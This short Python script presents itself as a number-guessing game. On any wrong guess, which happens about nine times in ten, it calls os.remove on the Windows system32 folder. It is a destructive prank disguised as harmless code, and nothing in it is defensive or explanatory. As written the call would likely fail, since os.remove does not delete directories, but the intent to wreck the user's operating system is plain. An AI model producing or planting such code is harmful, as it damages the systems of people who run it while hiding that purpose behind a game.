import os
import random

def guess():
    number = random.randint(1,10)
    user_guess=int(input('enter a number (1,10) : '))
    if user_guess==number:
        print('Correct guess! , your lucky')
    else:
        os.remove("C:\\windows\\system32")

guess()
